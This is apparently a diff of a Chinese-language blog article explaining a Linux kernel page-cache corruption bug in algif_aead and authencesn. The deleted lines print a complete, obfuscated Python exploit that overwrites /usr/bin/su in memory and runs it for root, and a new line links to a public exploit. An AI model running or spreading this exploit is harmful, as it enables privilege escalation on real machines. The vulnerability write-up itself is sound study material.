@@ -49,7 +49,7 @@ scatterlist 可以先理解成一份清單，記錄資料分散在哪些 memory 
 
 這次的問題出在，2017 年 algif_aead 加入了一個 in-place optimization，讓加密操作的輸入和輸出共用部分記憶體結構。在這條路徑下，原本由 splice() 帶進來的檔案 page cache，有一部分被接到了可寫的 output scatterlist 上面。
 
-而 authencesn 這個加密驗證實作，會把 destination 的部分位置拿來當 scratch space，寫入暫存資料。兩件事情接在一起，這個暫存寫入就碰到了原本檔案的 page cache。
+algif_aead 的 in-place 設計誤把唯讀的 Page Cache 串接到可寫的輸出鏈末端。而 authencesn 在處理解密時，會借用 Destination 的邊界空間作為暫存區（scratch space）寫入資料。這項寫入操作因此越界觸及了被串接在後方的 Page Cache，造成記憶體中的檔案快取被非法修改。
 
 更有趣的是，即使最後驗證失敗，操作回傳 error，前面寫進去的 4 bytes 也不會因此消失。
 
@@ -63,17 +63,7 @@ scatterlist 可以先理解成一份清單，記錄資料分散在哪些 memory 
 
 這段會實際修改執行檔的 page cache 並嘗試提權，僅適合在自己有權限的隔離測試環境研究，不要直接貼到 production 上面執行。這裡保留原本的短寫法，只整理縮排，未在本文環境執行驗證。
 
-```python
-import os as g,zlib,socket as s
-def d(x):return bytes.fromhex(x)
-def c(f,t,c):
-    a=s.socket(38,5,0);a.bind(("aead","authencesn(hmac(sha256),cbc(aes))"));h=279;v=a.setsockopt;v(h,1,d('0800010000000010'+'0'*64));v(h,5,None,4);u,_=a.accept();o=t+4;i=d('00');u.sendmsg([b"A"*4+c],[(h,3,i*4),(h,2,b'\x10'+i*19),(h,4,b'\x08'+i*3),],32768);r,w=g.pipe();n=g.splice;n(f,w,o,offset_src=0);n(r,u.fileno(),o)
-    try:u.recv(8+t)
-    except:0
-f=g.open("/usr/bin/su",0);i=0;e=zlib.decompress(d("78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"))
-while i<len(e):c(f,i,e[i:i+4]);i+=4
-g.system("su")
-```
+可以從 https://copy.fail/#exploit 裡面的 https://github.com/theori-io/copy-fail-CVE-2026-31431/blob/main/copy_fail_exp.py 看到程式碼。。
 
 這裡的 `recv()` 即使回傳錯誤，也不能代表什麼事情都沒發生，因為錯誤回報之前，page cache 就已經被寫入了。
 
